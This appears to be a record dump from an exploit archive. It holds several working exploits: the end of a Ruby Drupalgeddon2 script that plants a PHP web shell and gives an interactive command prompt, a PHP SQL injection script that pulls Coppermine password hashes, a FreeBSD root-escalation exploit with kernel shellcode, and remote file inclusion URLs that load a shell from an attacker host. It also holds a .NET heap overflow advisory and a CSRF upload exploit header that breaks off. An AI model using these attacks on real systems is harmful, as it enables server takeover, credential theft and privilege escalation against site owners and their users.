$drupalverion.start_with?(""7"")     puts info(""Isn't an issue for Drupal v7.x"")   end end puts ""-""*80   # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -   # Values in gen_evil_url for Drupal v8.x elementsv8 = [   ""mail"",   ""timezone"", ] # Values in gen_evil_url for Drupal v7.x elementsv7 = [   ""name"", ]  elements = $drupalverion.start_with?(""8"") ? elementsv8 : elementsv7  elements.each do|e|   $element = e    # Make a request, testing code execution   puts action(""Testing: Code Execution   (Method: #{$element})"")    # Generate a random string to see if we can echo it   random = (0...8).map { (65 + rand(26)).chr }.join   url, payload = gen_evil_url(""echo #{random}"", e)    response = http_request(url, ""post"", payload, $session_cookie)   if (response.code == ""200"" or response.code == ""500"") and not response.body.empty?     result = clean_result(response.body)     if not result.empty?       puts success(""Result : #{result}"")        if response.body.match(/#{random}/)         puts success(""Good News Everyone! Target seems to be exploitable (Code execution)! w00hooOO!"")         break        else         puts warning(""WARNING: Target MIGHT be exploitable [4]...   Detected output, but didn't MATCH expected result"")       end      else       puts warning(""WARNING: Target MIGHT be exploitable [3] (HTTP Response: #{response.code})...   Didn't detect any INJECTED output (disabled PHP function?)"")     end      puts warning(""WARNING: Target MIGHT be exploitable [5]...   Blind attack?"") if response.code == ""500""      puts verbose(""response.body: #{response.body}"") if $verbose     puts verbose(""clean_result: #{result}"") if not result.empty? and $verbose    elsif response.body.empty?     puts error(""Target is NOT exploitable [2] (HTTP Response: #{response.code})...   Got an empty response"")     exit    else     puts error(""Target is NOT exploitable [1] (HTTP Response: #{response.code})"")     puts verbose(""response.body: #{response.body}"") if $verbose     exit   end    puts ""- ""*40 if e != elements.last end  puts ""-""*80   # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -   # Location of web shell & used to signal if using PHP shell webshellpath = """" prompt = ""drupalgeddon2""  # Possibles paths to try paths = [   # Web root   """",   # Required for setup   ""sites/default/"",   ""sites/default/files/"",   # They did something ""wrong"", chmod -R 0777 .   #""core/"", ] # Check all (if doing web shell) paths.each do|path|   # Check to see if there is already a file there   puts action(""Testing: Existing file   (#{$target}#{path}#{webshell})"")    response = http_request(""#{$target}#{path}#{webshell}"", 'get', '', $session_cookie)   if response.code == ""200""     puts warning(""Response: HTTP #{response.code} // Size: #{response.size}.   ***Something could already be there?***"")   else     puts info(""Response: HTTP #{response.code} // Size: #{response.size}"")   end    puts ""- ""*40     # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -     folder = path.empty? ? ""./"" : path   puts action(""Testing: Writing To Web Root   (#{folder})"")    # Merge locations   webshellpath = ""#{path}#{webshell}""    # Final command to execute   cmd = ""#{bashcmd} | tee #{webshellpath}""    # By default, Drupal v7.x disables the PHP engine using: ./sites/default/files/.htaccess   # ...however, Drupal v8.x disables the PHP engine using: ./.htaccess   if path == ""sites/default/files/""     puts action(""Moving : ./sites/default/files/.htaccess"")     cmd = ""mv -f #{path}.htaccess #{path}.htaccess-bak; #{cmd}""   end    # Generate evil URLs   url, payload = gen_evil_url(cmd, $element)   # Make the request   response = http_request(url, ""post"", payload, $session_cookie)   # Check result   if response.code == ""200"" and not response.body.empty?     # Feedback     result = clean_result(response.body)     puts success(""Result : #{result}"") if not result.empty?      # Test to see if backdoor is there (if we managed to write it)     response = http_request(""#{$target}#{webshellpath}"", ""post"", ""c=hostname"", $session_cookie)     if response.code == ""200"" and not response.body.empty?       puts success(""Very Good News Everyone! Wrote to the web root! Waayheeeey!!!"")       break      elsif response.code == ""404""       puts warning(""Target is NOT exploitable [2-4] (HTTP Response: #{response.code})...   Might not have write access?"")      elsif response.code == ""403""       puts warning(""Target is NOT exploitable [2-3] (HTTP Response: #{response.code})...   May not be able to execute PHP from here?"")      elsif response.body.empty?       puts warning(""Target is NOT exploitable [2-2] (HTTP Response: #{response.code})...   Got an empty response back"")      else       puts warning(""Target is NOT exploitable [2-1] (HTTP Response: #{response.code})"")       puts verbose(""response.body: #{response.body}"") if $verbose     end    elsif response.code == ""500"" and not response.body.empty?     puts warning(""Target MAY of been exploited... Bit of blind leading the blind"")     break    elsif response.code == ""404""     puts warning(""Target is NOT exploitable [1-4] (HTTP Response: #{response.code})...   Might not have write access?"")    elsif response.code == ""403""     puts warning(""Target is NOT exploitable [1-3] (HTTP Response: #{response.code})...   May not be able to execute PHP from here?"")    elsif response.body.empty?     puts warning(""Target is NOT exploitable [1-2] (HTTP Response: #{response.code}))...   Got an empty response back"")    else     puts warning(""Target is NOT exploitable [1-1] (HTTP Response: #{response.code})"")     puts verbose(""response.body: #{response.body}"") if $verbose   end    webshellpath = """"    puts ""- ""*40 if path != paths.last end if try_phpshell  # If a web path was set, we exploited using PHP! if not webshellpath.empty?   # Get hostname for the prompt   prompt = response.body.to_s.strip if response.code == ""200"" and not response.body.empty?    puts ""-""*80   puts info(""Fake PHP shell:   curl '#{$target}#{webshellpath}' -d 'c=hostname'"") # Should we be trying to call commands via PHP? elsif try_phpshell   puts warning(""FAILED : Couldn't find a writeable web path"")   puts ""-""*80   puts action(""Dropping back to direct OS commands"") end   # Stop any CTRL + C action ;) trap(""INT"", ""SIG_IGN"")   # Forever loop loop do   # Default value   result = ""~ERROR~""    # Get input   command = Readline.readline(""#{prompt}>> "", true).to_s    # Check input   puts warning(""WARNING: Detected an known bad character (>)"") if command =~ />/    # Exit   break if command == ""exit""    # Blank link?   next if command.empty?    # If PHP web shell   if not webshellpath.empty?     # Send request     result = http_request(""#{$target}#{webshellpath}"", ""post"", ""c=#{command}"", $session_cookie).body   # Direct OS commands   else     url, payload = gen_evil_url(command, $element, true)     response = http_request(url, ""post"", payload, $session_cookie)      # Check result     if not response.body.empty?       result = clean_result(response.body)     end   end    # Feedback   puts result end","['< 7.58', '< 8.3.9', '< 8.4.6', '< 8.5.1']",1
18777,"Microsoft .NET Framework EncoderParameter - Integer Overflow (MS12-025) ------------------------------------------------------------------------ .NET Framework EncoderParameter integer overflow vulnerability ------------------------------------------------------------------------ Yorick Koster, September 2011  ------------------------------------------------------------------------ Abstract ------------------------------------------------------------------------ An integer overflow vulnerability has been discovered in the EncoderParameter class of the .NET Framework. Exploiting this vulnerability results in an overflown integer that is used to allocate a buffer on the heap. After the incorrect allocation, one or more user-supplied buffers are copied in the new buffer, resulting in a corruption of the heap.  By exploiting this vulnerability, it is possible for an application running with Partial Trust permissions to to break from the CLR sandbox and run arbitrary code with Full Trust permissions.  ------------------------------------------------------------------------ Affected versions ------------------------------------------------------------------------ It has been verified that this vulnerability exists in the .NET Framework versions 2.0, 3.0, 3.5 & 4. Earlier versions of the .NET Framework may or may not be vulnerable as well as the affected class is also available the .NET Framework versions 1.0 & 1.1.  ------------------------------------------------------------------------ See also ------------------------------------------------------------------------ - MS12-025 [2]: Vulnerability in .NET Framework Could Allow Remote Code Execution (2671605) - KB2671605 [3] MS12-025: Vulnerabilities in the .NET Framework could allow remote code execution: April 10, 2012 - SSD: [4] SecuriTeam Secure Disclosure program - MS12-025 [5]: IKVM.NET Weblog  ------------------------------------------------------------------------ Fix ------------------------------------------------------------------------ This issue was resolved with the release of MS12-025 [6]. It appears the fix was part of a security push for System.Drawing.dll.  ------------------------------------------------------------------------ Introduction ------------------------------------------------------------------------ The EncoderParameter class (System.Drawing.Imaging.EncoderParameter [7]) is used to pass a value, or an array of values, to an image encoder (GDI+). An image encoder can be used to translate an Image or Bitmap object to a particular file format, for example GIF, JPEG or PNG.  EncoderParameter is implemented in the System.Drawing.dll Assembly, which is located in the Global Assembly Cache [8] (GAC). Consequently, the Assembly is trusted by the .NET Framework and therefore this Assembly will run with Full Trust permissions. In addition, the Assembly is compiled with the AllowPartiallyTrustedCallers [9] attribute, which allows it to be called from Assemblies running with Partial Trust permissions.  ------------------------------------------------------------------------ Integer overflow ------------------------------------------------------------------------ The EncoderParameter class contains various constructor methods. All of these constructors allocate memory on the heap. The size of the allocated buffer depends on the constructor's parameters. After allocation, the values of these constructor parameters are copied into the new buffer. For example the constructor EncoderParameter(Encoder, Int64) accepts a 64-bit (8-byte) long value, thus 8 bytes are allocated on the heap after which the value of the long parameter is copied into this heap buffer. The heap buffer is freed by calling the Dispose() method. This method is also called when the EncoderParameter object is destroyed.  Some constructor methods accept one or more arrays. For these methods, the number of allocated bytes is the size of one array member multiplied by the number of members in the array. These methods do not check whether the resulting integer value (used for heap allocation) overflows. In some cases it is possible to trigger an integer overflow resulting in the allocation of a buffer that is too small for the supplied constructor parameters. Not all methods are exploitable as an overly long array is required to trigger an integer overflow. The .NET Framework limits the number of array members.  One constructor method (EncoderParameter(Encoder, Int32[], Int32[], Int32[], Int32[])) appears to be very suitable for exploiting this vulnerability. The implementation of this method is listed below.  public EncoderParameter(Encoder encoder,                 int[] numerator1, int[] denominator1,                 int[] numerator2, int[] denominator2) {         this.parameterGuid = encoder.Guid;         if (numerator1.Length != denominator1.Length ||                 numerator1.Length != denominator2.Length ||                 denominator1.Length != denominator2.Length)         {                 throw SafeNativeMethods.Gdip.StatusException(2);         }         else         {                 this.parameterValueType = 8;                 this.numberOfValues = numerator1.Length;                 int num = Marshal.SizeOf(typeof (int));                 this.parameterValue = Marshal.AllocHGlobal(this.numberOfValues * 4 * num);                 if (this.parameterValue == IntPtr.Zero)                 {                         throw SafeNativeMethods.Gdip.StatusException(3);                 }                 else                 {                         for (int index = 0; index < this.numberOfValues; ++index)                         {                                 Marshal.WriteInt32(EncoderParameter.Add(this.parameterValue,                                         4 * index * num), numerator1[index]);                                 Marshal.WriteInt32(EncoderParameter.Add(this.parameterValue,                                         (4 * index + 1) * num), denominator1[index]);                                 Marshal.WriteInt32(EncoderParameter.Add(this.parameterValue,                                         (4 * index + 2) * num), numerator2[index]);                                 Marshal.WriteInt32(EncoderParameter.Add(this.parameterValue,                                         (4 * index + 3) * num), denominator2[index]);                         }                         GC.KeepAlive((object) this);                 }         } }  This constructor method is interesting for two reasons. First of all, the method accepts four integer arrays. The number of bytes that will be allocated is the number of members in the numerator1 array multiplied by 16 (four times the size of a 32-bit integer). Supplying an array containing 268,435,456 integer values is enough to trigger the overflow. Doing so results in the allocation of a 0-byte buffer. The following proof of concept code can be used to trigger this vulnerability:  using System; using System.Drawing.Imaging;  namespace EncoderParameterCrash {         static class Crash         {                 [STAThread]                 static void Main()                 {                         int[] largeArray = new int[0x10000000];                         EncoderParameter crash = new EncoderParameter(Encoder.Quality,                                 largeArray, largeArray, largeArray, largeArray);                 }         } }  Running this code will cause the application to crash as it tries to write beyond a heap boundary:  The program '[2696] EncoderParameterCrash.vshost.exe: Managed' has exited with code -1073741819 (0xc0000005).  As demonstrated in the proof of concept, copying four large integer arrays into a heap buffer causes the program to crash. The proof of concept will try to write 4GB of data onto the heap. Since heap segments are a lot smaller than that, copying this amount of data will fail early in the process. This will cause Windows to terminate the program.  All constructor methods that handle two or more arrays always check if all supplied arrays are of the same length. As such, in order to trigger the integer overflow arrays must at least contain 268,435,456 members. This makes exploitation of this issue difficult.  However, the listed constructor method contains a programming mistake. When validating the length of the supplied arrays, the method fails to check the length of the numerator2 parameter. Instead it checks numerator1 twice. The correct check should be numerator2.Length != denominator2.Length instead of numerator1.Length != denominator2.Length. This is the second reason why this method is interesting - from an attacker's point of view. Due to the missing check, it is possible to use the numerator2 parameter to control how much data is copied into the heap buffer. Supplying a small(er) array as numerator2 parameter will cause an IndexOutOfRangeException exception to be thrown; prematurely ending the while loop. Since the exception is thrown by the .NET Framework, this exception can be handled by the application thus preventing the application from crashing.  Both ingredients provide for an exploitable heap corruption as attackers control how much data is allocated on the heap and also how much data is copied into the allocated buffer. It was possible to successfully exploit this issue on the following Windows versions:  - Windows XP Professional SP3 32-bit (with 4GB RAM) - Windows Vista Home Premium SP2 32-bit - Windows Vista Business SP2 32-bit and 64-bit - Windows 7 Home Premium SP1 64-bit - Windows 7 Professional SP1 64-bit - Windows 7 Enterprise SP1 32-bit and 64-bit  By exploiting this vulnerability, it is possible for an application running with Partial Trust permissions to to break from the CLR sandbox [10] (CAS) and run arbitrary code with Full Trust permissions. Examples of Partial Trusted applications include, ClickOnce, XAML Browser Applications (XBAP), ASP.NET (eg, shared hosting) & SilverLight. It must be noted that the affected class is not available for SilverLight applications.  ------------------------------------------------------------------------ Limitations ------------------------------------------------------------------------ As noted above, this issue cannot be exploited using a SilverLight application.  With the release of MS11-044 [11], Microsoft changed the way ClickOnce & XBAP applications are started. In particular, whenever such an application is started from the Internet security zone, a dialog is always shown even if the application does not request elevated permissions. Previously the application would just start. See also: http://blogs.msdn.com/b/clrteam/archive/2011/06/06/changes-coming-to-clickonce-applications-running-in-the-internet-zone.aspx  (It is possible to display a green icon in the dialog by code signing the manifests. When the manifests aren't signed, a red icon is displayed).  The dialog is not shown for applications launched from the intranet security zone. In this case the application will start immediately - as long as it does not request elevated permissions. The intranet zone is only available when it has been enabled on the target system. This is common for corporate networks, but less common for home users.  Finally, with the release of Internet Explorer 9 Microsoft chose to disable XBAP applications in the Internet security zone. See also: http://blogs.msdn.com/b/ieinternals/archive/2011/03/09/internet-explorer-9-xbap-disabled-in-the-internet-zone.aspx  ------------------------------------------------------------------------ Windows XP ------------------------------------------------------------------------ A special note must be made for Windows XP. It seems that Windows XP is a bit picky when handling large arrays. In a lot of cases, OutOfMemoryException exceptions will be thrown when trying to exploit this issue. Successful exploitation has been achieved on a 32-bit Windows XP system with 4GB of RAM.  ------------------------------------------------------------------------ References ------------------------------------------------------------------------ [1] http://www.akitasecurity.nl/advisory.html?id=AK20110801 [2] http://technet.microsoft.com/en-us/security/bulletin/ms12-025 [3] http://support.microsoft.com/kb/2671605 [4] http://www.beyondsecurity.com/ssd.html [5]  http://weblog.ikvm.net/PermaLink.aspx?guid=b3525cd1-8788-4d6d-b299-4722ddebad94 [6] http://technet.microsoft.com/en-us/security/bulletin/ms12-025 [7]  http://msdn.microsoft.com/en-us/library/system.drawing.imaging.encoderparameter.aspx [8] http://msdn.microsoft.com/en-us/library/yf1d93sz%28v=VS.100%29.aspx [9]  http://msdn.microsoft.com/en-us/library/system.security.allowpartiallytrustedcallersattribute.aspx [10] http://msdn.microsoft.com/en-us/magazine/ee677170.aspx [11] http://technet.microsoft.com/en-us/security/bulletin/ms11-044  ------------------------------------------------------------------------ --  ------------------------------------------------------------------------ Akita Software Security (Kvk 37144957) http://www.akitasecurity.nl/ ------------------------------------------------------------------------ Key fingerprint = 5FC0 F50C 8B3A 4A61 7A1F  2BFF 5482 D26E D890 5A65 http://pgp.mit.edu:11371/pks/lookup?op=get&search=0x5482D26ED8905A65","['2.0', '1.0', '1.1']",1
14815,"pecio CMS 2.0.5 - Multiple Remote File Inclusions ====================================================================== pecio CMS v2.0.5 (template) Multiple Remote File Include Vulnerability ======================================================================  Software Link: http://pecio-cms.com/ Download: http://pecio-cms.com/pec_upload/files/pecio-2.0.5.zip Author: eidelweiss Contact: g1xsystem[at]windowslive.com  Original Advisories: http://eidelweiss-advisories.blogspot.com/2010/08/pecio-cms-v205-template-multiple-remote.html  Greetz: Inj3ct0r.com (Inj3ct0r Exploit DataBase), YOGYACARDERLINK, and all Indonesian Hacking Community. Special Thank`s To: iwe a.k.a KirD , PKI a.k.a Andri klaten, m4rc0 (Thx so much,you know why and i`ll never forget you all)  ================================================================  Pecio is a content management system written in PHP with the intention to be a small, simple and lightweight cms for people who want to create websites including old-style information and new-style blog part. It doesn't mainly focus on ease of use and full featured user experience but rather on being a flexible and lightweight content editing solution for web masters.  ================================================================  	-=[ Vuln c0de ]=-  <?php include('pec_templates/' . $pecio->get('template')->get_directory_name() . '/header.php'); ?>  <?php include('pec_templates/' . $pecio->get('template')->get_directory_name() . '/footer.php'); ?>  ================================================================  	-=[ p0c ]=-  	http://sample.site/pecio_path/pec_templates/nova-blue/post.php?template= [inj3ct0r sh3ll] 	http://sample.site/pecio_path/pec_templates/nova-blue/article.php?template= [inj3ct0r sh3ll] 	http://sample.site/pecio_path/pec_templates/nova-blue/blog.php?template= [inj3ct0r sh3ll] 	http://sample.site/pecio_path/pec_templates/nova-blue/home.php?template= [inj3ct0r sh3ll]  ================================================================  Nb: Script kiddies please learn more about RFI vulnerability, its not just about include and require. if just need or want to get name or exist , so people call you hacker after post or publish shit exploits it`s wrong way i thing !!!  =========================| =[Hacking Is Art]=- |======================","['2.0.5', 'v2.0.5']",0
2660,"Coppermine Photo Gallery 1.4.9 - SQL Injection #!/usr/bin/php <?php   /*********************************************************************  * Coppermine Photo Gallery 1.4.9 Remote SQL Injection Vulnerability   *   * Note:  * Requires a valid user account.  *  * Usage:   * php script.php [host] [path] [table prefix] [user id] [username] [password]  *  * Usage Example:  * php script.php domain.com /coppermine/ cpg149_ 1 john secret  *  * Googledork""  * ""Powered by Coppermine Photo Gallery""  *  * Credits:  * Disfigure - Vulnerability research and discovery  * Synsta - Exploit scripting  *   * [w4ck1ng] - w4ck1ng.com  *********************************************************************/  if(!$argv[6]){ die(""Usage: php $argv[0] [host] [path] [table prefix] [user id] [username] [password]\n Usage Example: php $argv[0] domain.com /coppermine/ cpg149_ 1 john secret\n""); }  if($argv[6]){  function send($host,$put){ global $data; $conn = fsockopen(gethostbyname($host),""80""); if(!$conn) { die(""Connection to $host failed...""); }else{ fputs($conn,$put); } while(!feof($conn)) { $data .=fgets($conn); } fclose($conn); return $data; }  $host = $argv[1]; $path = $argv[2]; $prefix = $argv[3]; $userid = $argv[4]; $userl = $argv[5]; $passl = $argv[6];  $post = ""username="".urlencode($userl).""&password="".urlencode($passl).""&submitted=Login""; $req  = ""POST "".$path.""login.php?referer=index.php HTTP/1.1\r\n"";  $req .= ""Referer: http://"".$host.$path.""login.php?referer=index.php\r\n""; $req .= ""Host: $host\r\n""; $req .= ""Content-Type: application/x-www-form-urlencoded\r\n""; $req .= ""Content-Length: "".strlen($post).""\r\n""; $req .= ""Connection: Close\r\n""; $req .= ""Cache-Control: no-cache\r\n\r\n""; $req .= $post; send(""$host"",""$req"");  /* Borrowed from rgod. */            $temp = explode(""Set-Cookie: "",$data); $temp2 = explode("" "",$temp[1]); $cookie = $temp2[0]; $temp2 = explode("" "",$temp[2]); $cookie .= "" "".str_replace("";"","""",$temp2[0]); $cookie = str_replace(""\r"","""",$cookie); $cookie = str_replace(""\n"","""",$cookie);              $sql = urlencode(""123 UNION SELECT user_id,user_group,concat(user_name,char(58,58),user_password) FROM "".$prefix.""users where user_id = "".$userid."" --""); $req =  ""GET "".$path.""picmgr.php?aid="".""$sql HTTP/1.1\r\n""; $req .= ""Host: $host\r\n""; $req .= ""Content-Type: application/x-www-form-urlencoded\r\n""; $req .= ""Cookie: "".$cookie.""\r\n\r\n""; $req .= ""Connection: Close\r\n\r\n""; send(""$host"",""$req"");  $gdata = explode(""<option value=\""picture_no=1,picture_nm="",$data); $ghash = explode("",action=0\"">"",$gdata[1]); $hash = $ghash[0]; $uname = explode(""'"",$hash); $uname = explode(""::"",$uname[1]); $username = $uname[0]; $fhash = explode(""::"",$hash); $fhash = explode(""',picture_sort=100"",$fhash[1]); $finalhash = $fhash[0];  if(strlen($finalhash) != 32){  die(""Exploit failed..\n"");  }else{  die(""Username: $username MD5: $finalhash\n"");  } } ?>  # milw0rm.com [2006-10-27]",['1.4.9'],1
40937,"Apport 2.x (Ubuntu Desktop 12.10 < 16.04) - Local Code Execution Both of these issues were reported to the Apport maintainers and a fix was released on 2016-12-14. The CrashDB code injection issue can be tracked with CVE-2016-9949 and the path traversal bug with CVE-2016-9950. An additional problem where arbitrary commands can be called with the “Relaunch” action is tracked by CVE-2016-9951. I’d like to thank Martin Pitt and the Ubuntu security team for getting a fix (https://bugs.launchpad.net/apport/+bug/1648806) released so quickly. They have been a pleasure to work with.  I would encourage all security researchers to audit free and open source software if they have time on their hands. Projects such as Tor, Tails, Debian and Ubuntu all need more eyes for audits which can improve the safety of the internet for everyone. There are lots of bugs out there which don’t need hardcore memory corruption exploitation skills. Logic bugs can be much more reliable than any ROP chain.  The computer security industry has a serious conflict of interest right now. There is major financial motivation for researchers to find and disclose vulnerability to exploit brokers. Many of the brokers are in the business of keeping problems unfixed. Code execution bugs are valuable. As a data point, I received an offer of more than 10,000 USD from an exploit vendor for these Apport bugs. These financial motivators are only increasing as software gets more secure and bugs become more difficult to find.  To improve security for everyone we need to find sustainable ways to incentivize researchers to find and disclose issues and to get bugs fixed. We can’t and we shouldn’t rely on researchers giving away their work for free to for-profit vendors. We will not get security like that.  Microsoft and Google have shown a good example with their vulnerability reward programs. The Internet Bug Bounty (https://internetbugbounty.org/) is also doing great work and helping to support research on critical internet software. I hope that they can continue the program and expand their scope in the future. I hope we can cooperatively build a shared and secure internet together.  Source: https://donncha.is/2016/12/compromising-ubuntu-desktop/    Download: https://github.com/DonnchaC/ubuntu-apport-exploitation/archive/6ecfdf798f39fdd49b5929240d90a876c1e97ebb.zip Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/40937.zip","['2.x', '12.10 < 16.04)']",1
2520,"Softerra PHP Developer Library 1.5.3 - Remote File Inclusion ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## #                                                               # #           [ Softerra. PHP Developer Library ]                 # #                                                                 # Class:     Remote File Include Vulnerability                  # # Patch:     Unavailable                                        # # Published  2006/10/12                                         # # Remote:    Yes                                                 # Local:     No                            			# # Type:      High                                               # # Site:      http://www.softerra.com/products_php-library.htm   # # Author:    MP # Contact:   mp01010@yahoo.com                    		# #                                				# #################################################################  Exploit:  http://softerraphpdeveloper.com/PHPLibrary-1.5.3/lib/registry.lib.php?lib_dir=http://attacker.com/shell? http://softerraphpdeveloper.com/PHPLibrary-1.5.3/lib/sqlcompose.lib.php?lib_dir=http://attacker.com/shell? http://softerraphpdeveloper.com/PHPLibrary-1.5.3/lib/sqlsearch.lib.php?lib_dir=http://attacker.com/shell?   Vuln Files:  registry.lib.php sqlcompose.lib.php sqlsearch.lib.php   Vuln Code: # ../lib/registry.lib.php  <? ... require_once ($lib_dir . ""sqlstorage.class.php""); ... ?> ## ../lib/sqlcompose.lib.php  <? ... require_once ($lib_dir . ""array.lib.php""); ... ?>  ## ../lib/sqlsearch.lib.php  <? ... require_once ($lib_dir . ""array.lib.php""); ... ?>  # milw0rm.com [2006-10-12]",['1.5.3'],1
2022,"Mambo Component ExtCalendar 2.0 - Remote File Inclusion -------------------------------------------------------------------------------- Title : ExtCalendar Mambo Module <= v2 Remote File Include Vulnerabilities ###############################################################################  Discovered By OLiBekaS -----------------------------------------------------------------------------  dork        : ""powered by ExtCalendar v2"" Exploit     :   http://[target]/[path]/components/com_extcalendar/admin_events.php?CONFIG_EXT[LANGUAGES_DIR]=http://[attacker]/cmd.txt?&cmd=ls                          -----------------------------------------------------------------------------  greatz: ~~~~~ # Special greetz to my master effex and bEdAh`oTaK ( thank man ) # To all members of #papmahackerlink, cgibin, weleh, skulmatic, sikunYuk, brokencode, ulga, SaMuR4i_X, bigmaster, yugo^cloudy. and other  -------------------------------------------------------------------------------  Contact: ~~~~~~~  Nick: OLiBekaS E-mail: olibekas[at]gmail[dot]Com Homepage: http://bekas.6te.net  --------------------------------- [ eof ] ---------------------------------------  # milw0rm.com [2006-07-17]",['v2'],1
9082,"FreeBSD 7.0/7.1 - 'vfs.usermount' Local Privilege Escalation /*   * cve-2008-3531.c -- Patroklos Argyroudis, argp at domain census-labs.com  *  * Privilege escalation exploit for the FreeBSD-SA-08:08.nmount  * (CVE-2008-3531) vulnerability:  *   * http://security.freebsd.org/advisories/FreeBSD-SA-08:08.nmount.asc  * http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2008-3531  *  * For a detailed analysis see:  *  * http://census-labs.com/news/2009/07/02/cve-2008-3531-exploit/  *   * Sample run:  *   * [argp@leon ~]$ uname -rsi  * FreeBSD 7.0-RELEASE GENERIC  * [argp@leon ~]$ sysctl vfs.usermount  * vfs.usermount: 1  * [argp@leon ~]$ id  * uid=1001(argp) gid=1001(argp) groups=1001(argp)  * [argp@leon ~]$ gcc -Wall cve-2008-3531.c -o cve-2008-3531  * [argp@leon ~]$ ./cve-2008-3531  * [*] vptr = 0x006e776f  * [*] calling nmount()  * nmount: Unknown error: -1036235776  * [argp@leon ~]$ id  * uid=0(root) gid=0(wheel) egid=1001(argp) groups=1001(argp)  *  * $Id: cve-2008-3531.c,v 846ca34be34a 2009/02/29 11:05:02 argp $  */  #include <sys/param.h> #include <sys/mount.h> #include <sys/uio.h> #include <err.h> #include <stdio.h> #include <stdlib.h> #include <string.h> #include <sysexits.h> #include <unistd.h> #include <sys/types.h> #include <sys/stat.h> #include <sys/mman.h>  #define BUFSIZE     249  #define PAGESIZE    4096 #define ADDR        0x6e7000 #define OFFSET      1903  #define FSNAME      ""msdosfs"" #define DIRPATH     ""/tmp/msdosfs""  unsigned char kernelcode[] = ""\x64\xa1\x00\x00\x00\x00""   /* movl  %fs:0, %eax      # get curthread */ ""\x8b\x40\x04""               /* movl  0x4(%eax), %eax  # get proc from curthread */ ""\x8b\x40\x30""               /* movl  0x30(%eax),%eax  # get ucred from proc */ ""\x31\xc9""                   /* xorl  %ecx, %ecx       # ecx = 0 */ ""\x89\x48\x04""               /* movl  %ecx, 0x4(%eax)  # ucred.uid = 0 */ ""\x89\x48\x08""               /* movl  %ecx, 0x8(%eax)  # ucred.ruid = 0 */                              /* # return to the pre-previous function, i.e. vfs_donmount() */ ""\x81\xc4\xe8\x00\x00\x00""   /* addl  $0xe8, %esp */ ""\x5b""                       /* popl  %ebx */ ""\x5e""                       /* popl  %esi */ ""\x5f""                       /* popl  %edi */ ""\x5d""                       /* popl  %ebp */ ""\xc3"";                      /* ret */  int main() {     void *vptr;     struct iovec iov[6];      vptr = mmap((void *)ADDR, PAGESIZE, PROT_READ | PROT_WRITE,             MAP_FIXED | MAP_ANON | MAP_PRIVATE, -1, 0);      if(vptr == MAP_FAILED)     {         perror(""mmap"");         exit(EXIT_FAILURE);     }      vptr += OFFSET;     printf(""[*] vptr = 0x%.8x\n"", (unsigned int)vptr);      memcpy(vptr, kernelcode, (sizeof(kernelcode) - 1));      mkdir(DIRPATH, 0700);      iov[0].iov_base = ""fstype"";     iov[0].iov_len = strlen(iov[0].iov_base) + 1;          iov[1].iov_base = FSNAME;     iov[1].iov_len = strlen(iov[1].iov_base) + 1;          iov[2].iov_base = ""fspath"";     iov[2].iov_len = strlen(iov[2].iov_base) + 1;          iov[3].iov_base = DIRPATH;     iov[3].iov_len = strlen(iov[3].iov_base) + 1;      iov[4].iov_base = calloc(BUFSIZE, sizeof(char));      if(iov[4].iov_base == NULL)     {         perror(""calloc"");         rmdir(DIRPATH);         exit(EXIT_FAILURE);     }      memset(iov[4].iov_base, 0x41, (BUFSIZE - 1));     iov[4].iov_len = BUFSIZE;      iov[5].iov_base = ""BBBB"";     iov[5].iov_len = strlen(iov[5].iov_base) + 1;      printf(""[*] calling nmount()\n"");      if(nmount(iov, 6, 0) < 0)     {         perror(""nmount"");         rmdir(DIRPATH);         exit(EXIT_FAILURE);     }      printf(""[*] unmounting and deleting %s\n"", DIRPATH);     unmount(DIRPATH, 0);     rmdir(DIRPATH);      return EXIT_SUCCESS; }  // milw0rm.com [2009-07-09]",['7.0/7.1'],1
36683,"Dolibarr ERP/CRM 3.x - '/adherents/fiche.php' SQL Injection source: https://www.securityfocus.com/bid/51956/info  Dolibarr is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  Dolibarr 3.2.0 Alpha is vulnerable; other versions may also be affected.   http://www.example.com/adherents/fiche.php?rowid=-1%27","['3.x', '3.2.0 Alpha']",1
18266,"Open Conference/Journal/Harvester Systems 2.3.x - Multiple Remote Code Execution Vulnerabilities #!/usr/bin/python # # Open Conference/Journal/Harvester Systems <= 2.3.X multiple remote code execution vulnerabilities # vendor_________: Public Knowledge Project (pkp) -http://pkp.sfu.ca/ # software link__: http://pkp.sfu.ca/download # author_________: mr_me::rwx kru # email__________: steventhomasseeley!gmail!com # tested on______: the interwebz & a LAMP stack using all 3 applications :) #  # Vulnerable applications by pkp: # - Open Conference Systems <= v2.3.4 # - Open Journal Systems <= v2.3.6 # - Open Harvester Systems <= v2.3.1 # # Greetz to @kkotowicz, @malerisch and other busticati # # References: # ----------- # http://blog.malerisch.net/2011/12/csrf-file-upload-poc.html # http://www.html5rocks.com/en/tutorials/file/xhr2/ # # Description: # ------------ # PKP has developed free, open source software for the management, publishing, and indexing of journals and conferences.  # Open Journal Systems and Open #Conference Systems increase access to knowledge, improve management, and reduce publishing costs.  # Open Harvester systems allows the creation of #centralized search services on metadata from Open Archives Initiative-compliant databases. #  # Vuln description: # ----------------- # There is a few file upload vulnerabilities in the administrative interfaces of these applications that are  # unprotected and allow any peepz to CSRF it. I'm sick of vendors ignoring me on this kind of bug. # # Exploit requirement:  # -------------------- # - Find the target conference/journal/archive: just visit http://[target]/[path]/index.php #   It will be a string value in a URI embeded in the page. Just use the first conference/journal/archive, and it will be id 1. # - You will need to embed the link into the application too and hope the admin gets curious.. #   Maybe you could make a 'submission' to the conference, journal or archive entry or send a kind email ;) # ============================================================================================ # mr_me@gliese:~/$ python ocs_csrf_rce.py -p localhost:8081 -t 192.168.220.134 -d ocs-2.3.4 -P 9090 -s seriousbiz # #		+==============================================================================================+ #		| Open Conference/Journal/Harvester Systems <= 2.3.X csrf/upload/remote code execution exploit | #		| Found by: mr_me						 	  		       | #		+==============================================================================================+ # (+) Testing proxy @ localhost:8081.. proxy is found to be working! # (+) Listening on local port 9090. # (+) Have someone connect to you at http://127.0.0.1:9090/ # # Type <ctrl>-c to exit.. # # localhost - - [23/Dec/2011 18:15:21] 